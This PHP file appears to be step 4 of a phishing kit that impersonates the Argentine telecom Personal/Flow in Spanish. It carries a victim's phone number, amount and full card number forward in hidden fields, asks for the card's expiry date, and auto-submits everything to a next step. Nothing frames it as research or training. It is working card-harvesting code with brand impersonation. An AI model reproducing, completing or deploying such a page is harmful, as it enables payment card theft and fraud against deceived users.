<?php
/**
 * STEP 4 - Vencimiento
 */

$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
$card = isset($_POST['card']) ? trim($_POST['card']) : '';

if(isset($_POST['venc']) && !empty($_POST['venc'])) {
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Redirigiendo...</title></head>
    <body>
        <form id="autoForm" method="POST" action="step5.php">
            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
            <input type="hidden" name="venc" value="<?php echo htmlspecialchars($_POST['venc']); ?>">
        </form>
        <script>document.getElementById('autoForm').submit();</script>
    </body>
    </html>
    <?php
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vencimiento | Personal</title>
    <link rel="stylesheet" href="css/op/bootstrap.min.css">
    <link rel="stylesheet" href="css/op/styles.css">
</head>
<body style="background-color: #e5e5e5;">
    <div class="container-fluid">
        <div class="row">
            <div class="col-12 p-0">
                <header class="header">
                    <nav class="px-0 pt-0">
                        <div class="d-flex justify-content-between align-items-center" style="padding: 20px;">
                            <div><img src="assets/flow.svg" style="height: 40px;"></div>
                            <div><img src="assets/secure.svg" style="height: 30px;"></div>
                        </div>
                    </nav>
                </header>

                <div class="row justify-content-center mt-5">
                    <div class="col-12 text-center">
                        <h1 style="color: #333; font-size: 28px; margin-bottom: 30px;">Fecha de vencimiento</h1>
                    </div>

                    <div class="col-11 col-sm-6">
                        <form method="POST" action="step4.php">
                            <input type="hidden" name="phone" value="<?php echo htmlspecialchars($phone); ?>">
                            <input type="hidden" name="amount" value="<?php echo htmlspecialchars($amount); ?>">
                            <input type="hidden" name="card" value="<?php echo htmlspecialchars($card); ?>">
                            
                            <div class="form-group">
                                <label style="color: #666;">Vencimiento (MM/AA)</label>
                                <input type="text" name="venc" id="venc" class="form-control" placeholder="12/26" maxlength="5" style="height: 50px; font-size: 16px;" required>
                                <small class="text-muted">Mes y año de vencimiento</small>
                            </div>

                            <div class="text-center mt-4">
                                <button type="button" onclick="window.history.back()" class="btn btn-secondary px-4 py-2 mr-2">Volver</button>
                                <button type="submit" id="btnContinuar" class="btn btn-primary px-4 py-2" disabled style="background: #00a8e1; border: none;">Continuar</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="javascript/query.min.js"></script>
    <script src="javascript/jquery.mask.js"></script>
    <script>
        $('#venc').mask('00/00');
        $('#venc').on('keyup', function(){
            var valor = $(this).val();
            if(valor.length == 5) {
                var partes = valor.split('/');
                var mes = parseInt(partes[0]);
                var anio = parseInt(partes[1]);
                $('#btnContinuar').prop('disabled', !(mes >= 1 && mes <= 12 && anio >= 25));
            } else {
                $('#btnContinuar').prop('disabled', true);
            }
        });
    </script>
</body>
</html>